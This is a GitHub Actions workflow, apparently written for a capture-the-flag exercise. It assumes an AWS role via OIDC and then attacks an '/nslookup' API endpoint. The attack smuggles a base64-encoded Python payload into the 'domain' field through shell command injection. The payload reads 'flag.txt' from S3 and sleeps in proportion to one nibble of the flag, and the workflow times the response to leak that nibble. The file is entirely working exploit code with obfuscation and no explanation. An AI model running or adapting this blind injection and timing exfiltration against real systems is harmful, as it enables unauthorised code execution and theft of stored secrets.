name: recon

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Who am I
        run: aws sts get-caller-identity

      - name: NIBBLE2 byte[0] hi
        run: |
          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMF0+PjQpKjIrMikKZXhjZXB0OgogICAgcGFzcw=="
          INJECT="x; echo $B64 | base64 -d | python3 #"
          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
          START=$(date +%s%N)
          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" -d @payload.json
          END=$(date +%s%N)
          MS=$(( (END - START) / 1000000 ))
          NIBBLE=$(( MS / 1000 / 2 - 1 ))
          echo "byte[0] hi: ${MS}ms => nibble=$NIBBLE"
